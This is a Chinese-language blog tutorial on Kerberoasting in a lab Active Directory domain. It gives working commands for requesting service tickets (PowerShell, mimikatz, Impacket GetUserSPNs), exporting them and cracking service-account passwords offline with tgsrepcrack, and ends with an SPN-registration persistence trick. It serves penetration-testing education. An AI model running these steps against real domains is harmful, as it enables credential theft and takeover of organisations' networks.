---
title: "内网渗透-kerberoasting"
date: 2020-09-01 10:56:23 +0800
category: 内网渗透
tags: [内网,域]
excerpt: 内网渗透-kerberoasting
---
## 原理
用户凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求，KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash加密的TGS票据(这一步不管用户有没有访问服务的权限，只要TGT正确，就返回TGS票据，这也是kerberoating能利用的原因，任何一个用户，只要hash正确，可以请求域内任何一个服务的TGS票据

## 实验

+ 域控	192.168.5.130	Administrator
+ Win7	192.168.5.238
	机器账号SECQUAN_WIN7-PC\secquan_win7
	域用户账号ZHUJIAN\win7
+ 给域用户下的MSSQL服务注册SPN
```
setspn -A MSSQLSvc/SECQUAN_WIN7-PC.zhujian.com zhujian\win7
```
### powershell
#### 请求SPN Kerberos Tickets
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList " MSSQLSvc/SECQUAN_WIN7-PC.zhujian.com "
```
![](https://img-blog.csdnimg.cn/20190928081129295.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4NTAxMDg3,size_16,color_FFFFFF,t_70)
#### 查询所存放的票据
```
klist
```
![](https://img-blog.csdnimg.cn/20190928081130119.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4NTAxMDg3,size_16,color_FFFFFF,t_70)
#### mimikatz导出票据
```
kerberos::list /export
```
![](https://img-blog.csdnimg.cn/20190928081130748.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4NTAxMDg3,size_16,color_FFFFFF,t_70)
### MIMIKATZ
```
//通过Mimikatz指定服务主体名称作为目标
kerberos::ask /target:PENTESTLAB_001/WIN-PTELU2U07KG.PENTESTLAB.LOCAL:80
//输出票据
kerberos::list
//或者，加载Kiwi模块添加一些额外的Mimikatz命令，它们也可以执行相同的任务。
load kiwi
kerberos_ticket_list
//导出票据
kerberos::list /export
```
### Impacket-GetUserSPNs
```
python GetUserSPNs.py -request -dc-ip x.x.x.x 域名称/域用户
```
如下图所示，我们获得了数据库用户的票据
![](https://upload-images.jianshu.io/upload_images/18375121-e492f105aa31d815.png?imageMogr2/auto-orient/strip|imageView2/2/w/945/format/webp)
### 使用tgsrepcrack来破解
```
python tgsrepcrack.py mima.txt 1-40a00000-win7@MSSQLSvc~SECQUAN_WIN7-PC.zhujian.com-ZHUJIAN.COM.kirbi
```
![](https://img-blog.csdnimg.cn/2019092808113120.jpeg)
## kerberoasting后门利用
如果我们有了SPN的注册权限，我们就可以给指定的域用户注册一个SPN，然后获取到TGS，然后破解得到密码

这里我们用网上的一个例子来让大家明白一下流程即可，其他的内容均与前面所讲到的相同
![](https://img-blog.csdnimg.cn/20190928081131833.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4NTAxMDg3,size_16,color_FFFFFF,t_70)
文章首发公众号：[无心的梦呓(wuxinmengyi)](https://blog.csdn.net/qq_18501087/article/details/101593766)


